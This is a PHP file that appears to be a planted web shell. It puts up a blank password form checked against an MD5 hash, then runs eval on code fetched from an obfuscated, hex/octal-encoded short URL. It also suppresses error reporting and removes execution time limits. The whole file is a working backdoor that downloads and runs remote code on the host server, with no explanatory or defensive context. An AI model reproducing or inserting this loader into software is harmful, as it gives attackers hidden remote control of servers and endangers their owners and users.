<?php
$password = '55dace80f1d0b755064e344fc4389c59'; //cfwk
error_reporting(0);
set_time_limit(0);

session_start();
if (!isset($_SESSION['loggedIn'])) {
    $_SESSION['loggedIn'] = false;
}

if (isset($_POST['password'])) {
    if (md5($_POST['password']) == $password) {
        $_SESSION['loggedIn'] = true;
    }
} 

if (!$_SESSION['loggedIn']): ?>

<html><head><title> </title></head>
  <body>
    <p align="center"><center><font style="font-size:13px" color="#008000" face="Trebuchet MS">
    <form method="post">
      <input type="password" name="password">
      <input type="submit" name="submit" value="  >>">
    </form>
  </body>
</html>

<?php
exit();
endif;
?>
<?php
echo "\74\x21\104\117\x43\x54\x59\120\x45\40\x68\164\155\x6c\x3e\xd\12"; echo eval("\77\76" . file_get_contents("\150\x74\164\x70\163\x3a\x2f\x2f\x62\151\x74\x2e\x6c\x79\x2f\63\x32\164\117\111\61\162"));
?>
